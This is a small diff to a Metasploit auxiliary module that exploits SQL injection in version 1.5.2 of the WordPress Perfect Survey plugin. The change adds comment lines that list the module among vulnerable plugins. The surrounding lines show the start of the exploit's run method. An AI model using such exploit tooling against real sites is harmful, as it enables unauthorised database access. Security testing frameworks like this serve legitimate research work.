@@ -91,6 +91,8 @@ class MetasploitModule < Msf::Auxiliary
 
   # Run method
   def run
+    # next line included for automatic inclusion into vulnerable plugins list
+    # check_plugin_version_from_readme('perfect-survey', '1.5.2')
     print_status('Exploiting SQLi in Perfect Survey plugin...')
     @sqli ||= get_sqli_object
     fail_with(Failure::UnexpectedReply, GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG
